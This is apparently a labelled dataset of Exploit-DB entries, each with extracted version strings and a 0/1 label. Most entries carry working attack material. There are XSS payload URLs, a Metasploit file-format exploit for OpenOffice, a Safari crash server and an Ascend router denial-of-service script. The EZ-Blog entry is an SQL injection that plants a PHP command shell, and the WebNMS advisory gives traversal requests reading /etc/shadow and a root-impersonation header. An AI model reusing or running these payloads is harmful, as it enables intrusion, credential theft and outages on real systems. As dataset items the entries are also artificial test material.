35818,"Nagios 3.2.3 - 'expand' Cross-Site Scripting source: https://www.securityfocus.com/bid/48087/info  Nagios is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Nagios 3.2.3 is vulnerable; other versions may also be affected.   http://www.example.com/nagios/cgi-bin/config.cgi?type=command&expand=<script>alert(String.fromCharCode(88,83,83))</script> http://www.example.com/nagios/cgi-bin/config.cgi?type=command&expand=<body onload=alert(666)>",['3.2.3'],1
18923,"OpenOffice - OLE Importer DocumentSummaryInformation Stream Handling Overflow (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::FILEFORMAT  	def initialize(info={}) 		super(update_info(info, 			'Name'           => ""OpenOffice OLE Importer DocumentSummaryInformation Stream Handling Overflow"", 			'Description'    => %q{ 					This module exploits a vulnerability in OpenOffice 2.3.1 and 2.3.0 on 				Microsoft Windows XP SP3.  				By supplying a OLE file with a malformed DocumentSummaryInformation stream, an 				attacker can gain control of the execution flow, which results arbitrary code 				execution under the context of the user. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'Marsu <Marsupilamipowa[at]hotmail.fr>', # Vulnerability discovery and PoC 					'juan vazquez'  # Metasploit module 				], 			'References'     => 				[ 					['CVE', '2008-0320'], 					['OSVDB', '44472'], 					['BID', '28819'], 					['EDB', '5584'], 					['URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=694'] 				], 			'Payload'        => 				{ 					'Space' => 407 				}, 			'DefaultOptions'  => 				{ 					'EXITFUNC'          => 'process', 					'DisablePayloadHandler' => 'true' 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 						'OpenOffice 2.3.1 / 2.3.0 on Windows XP SP3', 						{ 							'Ret' => 0x609345fe, # add esp, ebx # ... # ret from tl680mi 							'EBX' => 0xffffefa8, # EBX value 							'JmpEsp' => 0x60915cbd, # push esp # ret from tl680mi 						} 					], 				], 			'Privileged'     => false, 			'DisclosureDate' => ""Apr 17 2008"", 			'DefaultTarget'  => 0))  			register_options( 				[ 					OptString.new('FILENAME', [true, 'The filename', 'msf.doc']) 				], self.class) 	end  	def exploit  		path = File.join(Msf::Config.install_root, 'data', 'exploits', 'CVE-2008-0320.doc') 		f = File.open(path, 'rb') 		template = f.read 		f.close  		my_payload = payload.encoded 		template[115717, 4] = [target['Ret']].pack(""V"") 		template[115725, 4] = [target['EBX']].pack(""V"") 		template[115729, 4] = [target['JmpEsp']].pack(""V"") 		template[115808, my_payload.length] = my_payload 		file_create(template)  	end  end","['2.3.1', '2.3.0']",1
18931,"Apple iOS 5.1.1 Safari Browser - 'JS match()' / 'search()' Crash (PoC) #!/usr/bin/env ruby  # - Title # iOS <= v5.1.1 Safari Browser JS match(), search() Crash PoC  # - Author # Alberto Ortega @a0rtega # alberto[@]pentbox[.]net  # - Summary # A vulnerability has been discovered in Apple Safari Browser # included in the last version of iOS (5.1.1). # # Previous versions may be affected too. # # When JavaScript function match() gets a big buffer as # parameter the browser unexpectedly crashes. # # By extension, the function search() is affected too. # # Tested on iOS 5.0.1, 5.1.0, 5.1.1 # Tested on iPod Touch, iPhone and iPad iOS devices.  require ""socket"" require ""optparse""  # Buffer values chr = ""A"" # The size of buffer needed may vary depending # on the device and the iOS version. buffer_len = 925000  # Magic packet body = ""\ <html>\n\ <head><title>Crash PoC</title></head>\n\ <script type=\""text/javascript\"">\n\ var s = \""poc\"";\n\ s.match(\""#{chr*buffer_len}\"");\n\ </script>\n\ </html>"";  def help() 	puts ""iOS <= v5.1.1 Safari Browser JS match(), search() Crash PoC"" 	puts ""#{$0} -p bind_port [-h bind_address] [--verbose]"" end  # Parsing options opts = {} optparser = OptionParser.new do |op| 	op.on(""-h"", ""--host HOST"") do |p| 		opts[""host""] = p 	end 	op.on(""-p"", ""--port PORT"") do |p| 		opts[""port""] = p 	end 	op.on(""-v"", ""--verbose"") do |p| 		opts[""verbose""] = true 	end end  begin 	optparser.parse! rescue 	help() 	exit 1 end  if (opts.length == 0 || opts[""port""] == nil) 	help() 	exit 1 end  if (opts[""verbose""] != nil) 	debug = true else 	debug = false end if (opts[""host""] != nil) 	host = opts[""host""] else 	host = ""0.0.0.0"" end port = opts[""port""]  # Building server if debug 	puts ""Buffer -> #{chr}*#{buffer_len}"" end  begin 	serv = TCPServer.new(host, port) 	puts ""Listening on #{host}:#{port.to_s} ..."" rescue 	puts ""Error listening on #{host}:#{port.to_s}"" 	exit 1 end  begin 	s = serv.accept() 	if debug 		puts ""Client connected, waiting petition ..."" 	end 	data = s.recv(1000) 	if debug 		puts ""Sending crafted packet ..."" 	end 	s.print(body) 	if debug 		puts ""Closing connection ..."" 	end 	s.close() 	puts ""Done!"" rescue 	puts ""Error sending data"" 	exit 1 end","['5.1.1', 'v5.1.1', 'iOS (5.1.1)']",0
27722,"phpLDAPadmin 0.9.8 - 'template_engine.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/17643/info       PHPLDAPAdmin is prone to multiple input-validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.       An attacker can exploit these issues to execute arbitrary HTML and script code in the browser of a victim user in the context of the affected website. This may allow the attacker to steal cookie-based authentication credentials, to control how the site is rendered to the user, and to launch other attacks.  http://www.example.com/template_engine.php?server_id=0&dn=%22%3Cscript%3Ealert(&#039;r0t&#039;)%3C/script%3E",['0.9.8'],1
27803,321soft PHP-Gallery 0.9 - 'index.php?path' Arbitrary Directory Listing source: https://www.securityfocus.com/bid/17812/info  PhP-Gallery is prone to an information-disclosure vulnerability and a cross-site scripting vulnerability. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker can exploit these vulnerabilities to retrieve arbitrary files from the vulnerable system in the context of the affected application or to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/index.php?path=/etc http://www.example.com/index.ph?path=/tmp,['0.9'],1
30529,Media Player Classic 6.4.9 - FLI File Remote Buffer Overflow source: https://www.securityfocus.com/bid/25437/info  Media Player Classic is prone to a buffer-overflow vulnerability because the application fails to properly bounds-check user-supplied data.  Attackers may attempt to exploit this issue by coercing users to access malicious FLI files.  Successfully exploiting this issue allows remote attackers to execute arbitrary machine code in the context of the user running the affected application. This facilitates the remote compromise of affected computers.  Media Player Classic 6.4.9.0 is vulnerable; other versions may also be affected.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/30529.fli,"['6.4.9', '6.4.9.0']",0
28383,"ImageMagick 6.x - '.SGI' Image File Remote Heap Buffer Overflow source: https://www.securityfocus.com/bid/19507/info  ImageMagick is prone to a remote heap buffer-overflow vulnerability because the application fails to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.  This issue allows attackers to execute arbitrary machine code in the context of applications that use the ImageMagick library.  ImageMagick versions in the 6.x series, up to version 6.2.8, are vulnerable to this issue.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/28383.sgi","['6.x', '6.x series', 'up to version 6.2.8']",1
40229,"WebNMS Framework Server 5.2/5.2 SP1 - Multiple Vulnerabilities >> Multiple vulnerabilities in WebNMS Framework Server 5.2 and 5.2 SP1 >> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security ========================================================================== Disclosure: 04/07/2016 / Last updated: 08/08/2016  >> Background on the affected product: ""WebNMS is an industry-leading framework for building network management applications. With over 25,000 deployments worldwide and in every Tier 1 Carrier, network equipment providers and service providers can customize, extend and rebrand WebNMS as a comprehensive Element Management System (EMS) or Network Management System (NMS). NOC Operators, Architects and Developers can customize the functional modules to fit their domain and network. Functional modules include Fault Correlation, Performance KPIs, Device Configuration, Service Provisioning and Security. WebNMS supports numerous Operating Systems, Application Servers, and databases.""   >> Summary: WebNMS contains three critical vulnerabilities that can be exploited by an unauthenticated attacker: one directory traversal that can be used to achieve remote code execution, another directory traversal that can be abused to download any text file in the system and the possibility to impersonate any user in the system. In addition, WebNMS also stores the user passwords in a file with a weak obfuscation algorithm that can be easily reversed.  A special thanks to the SecuriTeam Secure Disclosure programme (SSD), which performed the disclosure in a responsible manner to the affected vendor. This advisory can be seen in their blog at https://blogs.securiteam.com/index.php/archives/2712  Metasploit exploits for all vulnerabilities have also been released.   >> Technical details: #1 Vulnerability: Directory traversal in file upload functionality (leading to remote code execution) CVE-2016-6600 Attack Vector: Remote Constraints: Can be exploited by an unauthenticated attacker. See below for other constraints. Affected versions: unknown, at least 5.2 and 5.2 SP1  The FileUploadServlet has a directory traversal vulnerability, that allows an unauthenticated attacker to upload a JSP file that executes on the server.  To exploit this vulnerability, simply POST as per the proof of concept below. The directory traversal is in the ""fileName"" parameter.  POST /servlets/FileUploadServlet?fileName=../jsp/Login.jsp HTTP/1.1 <JSP payload here>  There are two things to keep in mind for the upload to be successful: - Only text files can be uploaded, binary files will be mangled. - In order to achieve code execution without authentication, the files need to be dropped in ../jsp/ but they can only have the following names: either Login.jsp or a WebStartXXX.jsp, where XXX is any string of any length.   #2 Vulnerability: Directory traversal in file download functionality CVE-2016-6601 Attack Vector: Remote Constraints: Can be exploited by an unauthenticated attacker. Only text files can be downloaded properly, any binary file will get mangled by the servlet and downloaded incorrectly. Affected versions: unknown, at least 5.2 and 5.2 SP1  The FetchFile servlet has a directory traversal vulnerability that can be abused by an unauthenticated attacker to download arbitrary files from the WebNMS host. The vulnerable parameter is ""fileName"" and a proof of concept is shown below.  GET /servlets/FetchFile?fileName=../../../etc/shadow   #3 Vulnerability: Weak obfuscation algorithm used to store passwords CVE-2016-6602 Attack Vector: Remote Constraints: Can be exploited by an unauthenticated attacker. Affected versions: unknown, at least 5.2 and 5.2 SP1  The ./conf/securitydbData.xml file (in the WebNMS WEB-INF directory) contains entries with all the usernames and passwords in the server: <DATA ownername=""NULL"" password=""e8c89O1f"" username=""guest""/> <DATA ownername=""NULL"" password=""d7963B4t"" username=""root""/>  The algorithm used to obfuscate is convoluted but easy to reverse engineer. The passwords above are ""guest"" for the ""guest"" user and ""admin"" for the ""root"" user. A Metasploit module implementing the deobfuscation algorithm has been released.  This vulnerability can be combined with #2 and allow an unauthenticated attacker to obtain credentials for all user accounts: GET /servlets/FetchFile?fileName=conf/securitydbData.xml    #4 Vulnerability: User account impersonation / hijacking CVE-2016-6603 Attack Vector: Remote Constraints: Can be exploited by an unauthenticated attacker. Affected versions: unknown, at least 5.2 and 5.2 SP1  It is possible to impersonate any user in WebNMS by simply setting the ""UserName"" HTTP header when making a request, which will return a valid authenticated session cookie. This allows an unauthenticated attacker to impersonate the superuser (""root"") and perform administrative actions. The proof of concept is shown below:  GET /servlets/GetChallengeServlet HTTP/1.1 UserName: root  This returns the cookie ""SessionId=0033C8CFFE37EB6093849CBA4BF2CAF3;"" which is a valid, JSESSIONID cookie authenticated as the ""root"" user. This can then be used to login to the WebNMS Framework Server by simply setting the cookie and browsing to any page.   >> Fix: Since the vendor did not respond to any contacts attempted by Beyond Security and its SSD programme, it is not known whether a fixed version of WebNMS Framework Server has been released. It is highly recommended not to expose the server to any untrusted networks (such as the Internet).   ================ Agile Information Security Limited http://www.agileinfosec.co.uk/ >> Enabling secure digital business >>","['5.2/5.2 SP1', '5.2', '5.2 SP1']",1
20332,"Ascend R 4.5 Ci12 - Denial of Service (Perl) # #source: https://www.securityfocus.com/bid/1855/info #  #A vulnerability exists in the operating system of some Ascend routers. If an invalid TCP packet (of zero length) is sent to the administration port of Ascend Routers 4.5Ci12 #or earlier, the result will be a crash and reboot of the attacked router, accomplishing a denial of service attack. #  #Note that 3Com is reportedly also vulnerable, but it is not verified which versions of IOS are exploitable. #  #!/usr/bin/perl  # # Ascend Kill II - perl version # (C) 1998 Rootshell - http://www.rootshell.com/ - <info@rootshell.com> # # Released: 3/17/98 # # Thanks to Secure Networks.  See SNI-26: Ascend Router Security Issues # (http://www.secnet.com/sni-advisories/sni-26.ascendrouter.advisory.html) # #  NOTE: This program is NOT to be used for malicous purposes.  This is #        intenteded for educational purposes only.  By using this program #        you agree to use this for lawfull purposes ONLY. # #  use Socket;  require ""getopts.pl"";  sub AF_INET {2;} sub SOCK_DGRAM {2;}  sub ascend_kill {   $remotehost = shift(@_);   chop($hostname = `hostname`);   $port = 9;   $SIG{'INT'} = 'dokill';   $sockaddr = 'S n a4 x8';   ($pname, $aliases, $proto) = getprotobyname('tcp');   ($pname, $aliases, $port) = getservbyname($port, 'tcp')   unless $port =~ /^\d+$/;   ($pname, $aliases, $ptype, $len, $thisaddr) =   gethostbyname($hostname);   $this = pack($sockaddr, AF_INET, 0, $thisaddr);   ($pname, $aliases, $ptype, $len, $thataddr) = gethostbyname($remotehost);   $that = pack($sockaddr, AF_INET, $port, $thataddr);   socket(S, &AF_INET, &SOCK_DGRAM, 0);     $msg = pack(""c64"",     0x00, 0x00, 0x07, 0xa2, 0x08, 0x12, 0xcc, 0xfd, 0xa4, 0x81, 0x00, 0x00,     0x00, 0x00, 0x12, 0x34, 0x56, 0x78, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,     0xff, 0xff, 0x00, 0x4e, 0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0x4e,     0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0xff, 0x50, 0x41, 0x53, 0x53,     0x57, 0x4f, 0x52, 0x44, 0x50, 0x41, 0x53, 0x53, 0x57, 0x4f, 0x52, 0x44,     0x50, 0x41, 0x53, 0x53);   for ($i=0; $i<500; $i++) {     $msg .= pack(""c1"", 0xff);   }   send(S,$msg,0,$that) || die ""send:$!""; }  if ($ARGV[0] eq '') {   print ""usage: akill2.pl <remote_host>\n"";   exit; }  &ascend_kill($ARGV[0]);","['4.5 Ci12', 'II']",1
8547,"EZ-Blog Beta2 - 'category' SQL Injection *********************************************************************************************** *********************************************************************************************** **	       										     ** **  											     ** **     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    ** **     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    ** ** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    ** **  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\  **==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>-- **  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/     [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    ** **							                                     ** **    											     ** **                          Â¡VIVA SPAIN!...Â¡GANAREMOS EL MUNDIAL!...o.O                      ** **					Â¡PROUD TO BE SPANISH!				     ** **											     ** *********************************************************************************************** ***********************************************************************************************  ---------------------------------------------------------------------------------------------- |       	   	    	  SQL INJECTION VULNERABILITY		             	     | |--------------------------------------------------------------------------------------------| |                         	| 	  EZ-blog Beta2        |		 	     | |  CMS INFORMATION:		 ------------------------------			             | |										             | |-->WEB: http://sourceforge.net/projects/ez-blog/          				     | |-->DOWNLOAD: http://sourceforge.net/projects/ez-blog/            	                     | |-->DEMO: N/A										     | |-->CATEGORY: CMS / Blogging								     | |-->DESCRIPTION: EZ-Blog is an open-source blog program written in PHP.       	             | |		Presently, only MySQL is supported, but a PostgreSQL version is planned.     | |-->RELEASED: 2009-04-26								     | |											     | |  CMS VULNERABILITY:									     | |											     | |-->TESTED ON: firefox 3						                     | |-->DORK: N/A									             | |-->CATEGORY: SQL INJECTION (SHELL UPLOAD)					             | |-->AFFECT VERSION: <=1 Beta2						 		     | |-->Discovered Bug date: 2009-04-26							     | |-->Reported Bug date: 2009-04-27							     | |-->Fixed bug date: Not fixed								     | |-->Info patch: Not fixed							             | |-->Author: YEnH4ckEr									     | |-->mail: y3nh4ck3r[at]gmail[dot]com							     | |-->WEB/BLOG: N/A									     | |-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       | |-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     | ----------------------------------------------------------------------------------------------   ######################### ////////////////////////  SQL INJECTION (SQLi):  //////////////////////// #########################   <<<<---------++++++++++++++ Condition: magic_quotes_gpc=off +++++++++++++++++--------->>>>   ------- INTRO: -------   An exploit was published by drosophila with Multiple SQL Injection in EZ-blog Beta-1,  they've (apparently) fixed it but the system is still vulnerable.   Source: http://www.milw0rm.com/exploits/8128   ----------- FILE VULN: -----------  Path --> [HOME_PATH]/public/specific.php  ...  $whichcategory = Trim($_POST['category']);  ... 	if ($whichcategory=='All'){ 		$query  = ""SELECT * FROM content ORDER BY id DESC"";	 	}else{ 		$query  = ""SELECT * FROM content WHERE  topic ='"" . $whichcategory . ""' ORDER BY id DESC""; 	}	 	$result = mysql_query($query); ...   ------------------ PROOF OF CONCEPT: ------------------  Copy and save --> PoC.html. Configure --> HOST, HOME_PATH  <html> <title> PoC BY Y3NH4CK3R --PROUD TO BE SPANISH--> </title> <h1> Click ""Execute PoC"" to launch the proof of concept (SQLi)... </h1> <body bgcolor=#000000 text=#ffffff> <form method=""post"" action=""http:[HOST]/[HOME_PATH]/public/specific.php""> <input type=""hidden"" name=""category"" value=""-1' union all select version(),version(),version(),version(),version(),version(),version(),version()/*""> <input name=""submit"" value=""Execute PoC"" type=""submit""> </form> <br> <br> <h2> <font color=#ff0000> BY y3nh4ck3r. Contact: y3nh4ck3r@gmail.com </font> </h2> </body> </html>   ------------------------ EXPLOIT (SHELL UPLOAD): ------------------------  This aplication hasn't admin authentication using DB, ie, admin panel uses .htaccess file.  This is a complete exploit: SQL Injection --> Shell Upload, and XSS...all in one ;)  Copy and save --> exploit.html. Configure --> HOST, HOME_PATH and COMPLETE-PATH.   <html> <title> PoC BY Y3NH4CK3R --PROUD TO BE SPANISH--> </title> <h1> Click ""Upload shell"" to launch the exploit (SQLi)... </h1> <body bgcolor=#000000 text=#ffffff> <form method=""post"" action=""http://[HOST]/[HOME_PATH]/public/specific.php""> <input type=""hidden"" name=""category"" value=""-1' union all select '<HTML><title>SHELL BY --Y3NH4CK3R--></title><body text=#ffffff bgcolor=#000000><center><h1>','YOUR SHELL IS ON!<br></h1></center><br><br>','<font color=#ff0000><h2>Get var (cmd) to execute comands. Enjoy it!</h2></font>','<script>alert(String.fromCharCode(67,111,109,109,97,110,100,32,101,120,101,99,117,116,101,100,33))</script>','<h3>Command Result:</h3>','<?php system($_GET[cmd]); ?>','<br><br><font color=#ff0000><h3>By y3nh4ck3r. Contact: y3nh4ck3r@gmail.com</h3></font></body>','</HTML>' INTO OUTFILE '[COMPLETE-PATH]/public/shell.php'/*""> <input name=""submit"" value=""Upload shell"" type=""submit""> </form><br> <h3> Your shell in ""http://[HOST]/[HOME_PATH]/public/shell.php"" </h3> <br> <h2> <font color=#ff0000> BY y3nh4ck3r. Contact: y3nh4ck3r@gmail.com </font> </h2> </body> </html>   Your shell in --> http://[HOST]/[HOME_PATH]/public/shell.php   <<<-----------------------------EOF---------------------------------->>>ENJOY IT!   ####################################################################### ####################################################################### ##*******************************************************************## ## ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ## ##*******************************************************************## ##-------------------------------------------------------------------## ##*******************************************************************## ##  GREETZ TO: drosophila, JosS and all SPANISH Hack3Rs community!   ## ##*******************************************************************## ####################################################################### #######################################################################  # milw0rm.com [2009-04-27]","['Beta2', 'Beta-1']",1
8595,"Adobe Acrobat Reader 8.1.2 < 9.0 - 'getIcon()' Memory Corruption Affected Version   : Acrobat Reader 8.1.2 - 9.0 Vendor  Patch      : http://www.adobe.com/support/security/bulletins/apsb09-04.html Tested   On        : XP SP2 / SP3  from ZDI :  http://www.zerodayinitiative.com/advisories/ZDI-09-014/  This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Adobe Acrobat and Adobe Reader. User interaction is required in that a user must visit a malicious web site or open a malicious file.The specific flaw exists when processing malicious JavaScript contained in a PDF document. When supplying a specially crafted argument to the getIcon() method of a Collab object, proper bounds checking is not performed resulting in a stack overflow. If successfully exploited full control of the affected machine running under the credentials of the currently logged in user can be achieved.  This vulnerability was discovered by:  Tenable Network Security (there is a man named Nicolas Pouvesle and we know == > he has lots of exploitation method  ; ))  Exploit By :  www.Abysssec.com  note : this exploit is just for educational purpose so shellcode will execute calc if you want other shellcode change shellcode .  Exploit Link : http://abysssec.com/Adobe.Collab.getIcon().pdf Mirror  Link : https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/8595.pdf (2009-Adobe.Collab.getIcon.pdf)  # milw0rm.com [2009-05-04]","['8.1.2 < 9.0', '8.1.2', '9.0']",1
27574,"Basic Analysis and Security Engine (BASE) 1.2.4 - PrintFreshPage Cross-Site Scripting source: https://www.securityfocus.com/bid/17391/info  BASE is prone to a cross-site scripting vulnerability. The application fails to properly sanitize user-supplied input in the 'PrintFreshPage' function.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  This issue affects version 1.2.4; other versions may also be vulnerable.  http://www.example.com/base/base_graph_main.php?back=""><script>alert(""780"")</script><""  http://www.example.com/base/base_stat_ipaddr.php?ip=1.1.1.1&netmask=""><script>alert(""780"")</script><""  http://www.example.com/base-snort/base_qry_alert.php?submit=<script>780</script>&sort_order=",['1.2.4'],1
4833,"NetRisk 1.9.7 - Local/Remote File Inclusion #########################################################################         NetRisk <= 1.9.7 Remote/Local File Inclusion Vulnerability      # ######################################################################### AUTHOR     : S.W.A.T.							# HOME       : http://svvat.ir					        # Download   : http://phprisk.org/netrisk_1.9.7.zip                       # ######################################################################### DorKs      : inurl:index.php?page=gamebrowser                           # ######################################################################### ## EXPLOIT :                                                            # http://server.com/Path/index.php?page=[SHELL]                           # http://server.com/Path/index.php?page=[-LFI-]                           # ######################################################################### ## GREETZ  : Str0ke - Dj7xpl - DarKLiFe - NazNazi - XmorsTEAM           # ######################################################################### ## Note    : BaBayE NET For Ever :-h =; :(( :((                         # ######################################################################### ========================================================================# ||  ##    ##   ##           ##########   #######     ########         ||# ||   ##  ##    ##########   ##########   ##   ##     ##               ||# ||    ####     ##########   ##      ##   #######     ########         ||# ||    ####     ##  ##  ##   ##      ##   #######           ##         ||# ||   ##  ##    ##  ##  ##   ##########   ##    ##          ##         ||# ||  ##    ##   ##  ##  ##   ##########   ##     ##   ########         ||# ========================================================================# ######################################################################### #								        # #   BYE ALL MY FRIENDS OVER THE NET & EVERYTHING ON THE NET             # #								        # #########################################################################  # milw0rm.com [2008-01-04]",['1.9.7'],1
19619,"QPC Software QVT Term 4.3/QVT/Net 4.3 Suite FTP Server - Denial of Service source: https://www.securityfocus.com/bid/796/info  The FTP server that ships with QPC's QVT line of products is vulnerable to a denial of service attack. The FTP server has an unchecked buffer in the logon function. If a username/password pair is specified that is longer than 2000 characters combined, the server will drop the connection with an 'authentication failed' message. The next time someone tries to connect, the server will crash.   19619-2.exe - binary 19619-1.zip - source   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/19619-1.zip  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/19619-2.exe","['4.3/QVT/Net', '4.3', 'FTP']",1
